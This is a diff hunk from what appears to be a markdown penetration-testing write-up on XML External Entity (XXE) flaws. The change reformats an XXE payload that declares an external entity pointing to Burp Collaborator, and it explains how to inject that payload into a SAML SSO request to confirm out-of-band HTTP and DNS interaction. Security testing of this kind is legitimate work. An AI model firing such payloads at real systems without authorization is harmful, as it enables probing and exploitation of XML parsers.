@@ -42,11 +42,7 @@ XXE is a vulnerability that occurs when an attacker is able to include external 
 
 XXE (External Entity Interaction - HTTP & DNS)
 Add the following payload, include an arbitrary entity name, and the URL of the Burp Collaborator:
-```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://burpcollaborator.net">
-]>
-```
+`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> `
 Insert this payload after the initial XML declaration and reference the created entity using `&entityID;` right after the first `https://localhost:9443/samlsso` URL. 
 Re-encode the payload and forward the request. In a matter of seconds, the Collaborator should receive the out-of-band interactions, and as expected, the detected IPs confirm an interaction.
 
